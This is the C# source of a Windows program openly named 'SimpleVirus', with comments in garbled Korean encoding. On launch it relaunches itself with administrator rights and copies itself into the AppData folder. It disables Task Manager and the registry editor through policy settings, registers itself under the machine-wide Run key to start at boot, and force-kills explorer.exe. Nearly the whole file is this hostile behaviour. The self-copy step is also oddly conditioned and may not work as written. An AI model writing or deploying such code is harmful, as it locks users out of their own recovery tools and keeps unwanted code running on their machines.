using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Principal;

namespace SimpleVirus
{
    internal static class Program
    {
        public static string ApplicationName { get; } = "SimpleVirus";


        /// <summary>
        /// ���α׷� ��������
        /// </summary>
        [STAThread]
        public static void Main()
        {
            Initialize();

            ApplicationConfiguration.Initialize();
            Application.Run(new MainForm());
        }

        /// <summary>
        /// ���α׷� �ʱ�ȭ �Լ�
        /// </summary>
        private static void Initialize()
        {
            string workDir = Path.Combine(Environment.GetFolderPath(
                Environment.SpecialFolder.ApplicationData), ApplicationName);

            if (Application.StartupPath != workDir)
            {
                SelfReplication(workDir);

                Policies.SetPoliciesSetting(PoliciesType.TaskManager, false);
                Policies.SetPoliciesSetting(PoliciesType.RegistryTools, false);

                SetStartUp(ApplicationName, Path.Combine(workDir, ApplicationName + ".exe"), true);

                Process.Start("taskkill", "/f /im explorer.exe");
            }
        }

        /// <summary>
        /// ���α׷��� �ٸ���ġ�� ����
        /// </summary>
        /// <param name="destinationDir">������ ��ġ</param>
        private static void SelfReplication(string destinationDir)
        {
            if (IsAdministrator() == false)
            {
                try
                {
                    ProcessStartInfo info = new()
                    {
                        UseShellExecute = true,
                        FileName = Application.ExecutablePath,
                        Verb = "runas"
                    };

                    Process.Start(info);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ApplicationName,
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Application.Exit();
                }
            }
            else
            {
                if (Directory.Exists(destinationDir))
                {
                    Directory.Delete(destinationDir, true);
                    CopyDirectory(Application.StartupPath, destinationDir, true);
                }
            }
        }

        /// <summary>
        /// ������ �ٸ� ��ġ�� ����
        /// </summary>
        /// <param name="sourceDir">������ ���� ��ġ</param>
        /// <param name="destinationDir">������ ���� ��ġ</param>
        /// <param name="recursive">����� ����</param>
        private static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
        {
            DirectoryInfo dirInfo = new(sourceDir);

            if (!dirInfo.Exists )
                return;

            DirectoryInfo[] dirs = dirInfo.GetDirectories();
            Directory.CreateDirectory(destinationDir);

            foreach (FileInfo file in dirInfo.GetFiles())
            {
                string targetFilePath = Path.Combine(destinationDir, file.Name);
                file.CopyTo(targetFilePath);
            }

            if (recursive)
            {
                foreach (DirectoryInfo subDir in dirs)
                {
                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                }
            }
        }

        /// <summary>
        /// ���α׷��� �������α׷��� ���
        /// </summary>
        /// <param name="programName">���ø����̼� �̸�</param>
        /// <param name="programPath">���ø����̼� ��ġ</param>
        /// <param name="enable">Ȱ��ȭ ����</param>
        private static void SetStartUp(string programName, string programPath, bool enable)
        {
            const string registryKeyPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            string keyValue = programName;
            
            RegistryKey objRegistryKey = Registry.LocalMachine.CreateSubKey(registryKeyPath);

            if (enable && objRegistryKey.GetValue(keyValue) == null)
                objRegistryKey.SetValue(keyValue, programPath);
            else if (!enable)
                objRegistryKey.DeleteValue(keyValue);

            objRegistryKey.Close();
        }

        /// <summary>
        /// ������ ���� ���� Ȯ��
        /// </summary>
        /// <returns>������ ���� ����</returns>
        private static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            
            if (identity != null)
            {
                WindowsPrincipal principal = new(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }

            return false;
        }
    }
}
